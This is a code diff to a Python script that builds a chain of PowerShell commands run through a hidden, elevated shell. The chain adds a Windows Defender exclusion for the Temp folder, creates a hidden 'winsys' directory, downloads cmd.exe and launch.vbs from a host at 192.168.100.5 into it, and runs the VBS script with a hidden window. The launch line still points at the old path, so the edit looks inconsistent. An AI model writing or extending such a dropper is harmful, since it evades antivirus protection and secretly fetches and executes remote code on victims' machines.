@@ -6,8 +6,10 @@ def run_hidden_admin_powershell(command):
 def main():
     commands = [
         'Add-MpPreference -ExclusionPath `"$env:Temp`"',
-        'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile `"$env:Temp\\cmd.exe`"',
-        'Invoke-WebRequest -Uri http://192.168.100.5/launch.vbs -OutFile `"$env:Temp\\launch.vbs`"',
+        'New-Item -Path `"$env:Temp\\winsys`" -ItemType Directory -Force',
+        'Set-ItemProperty -Path `"$env:Temp\\winsys`" -Name Attributes -Value `"Hidden`"',
+        'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile `"$env:Temp\\winsys\\cmd.exe`"',
+        'Invoke-WebRequest -Uri http://192.168.100.5/launch.vbs -OutFile `"$env:Temp\\winsys\\launch.vbs`"',
         'Start-Process -FilePath `"$env:Temp\\launch.vbs`" -WindowStyle Hidden'
     ]
     powershell_command = ";".join(commands)
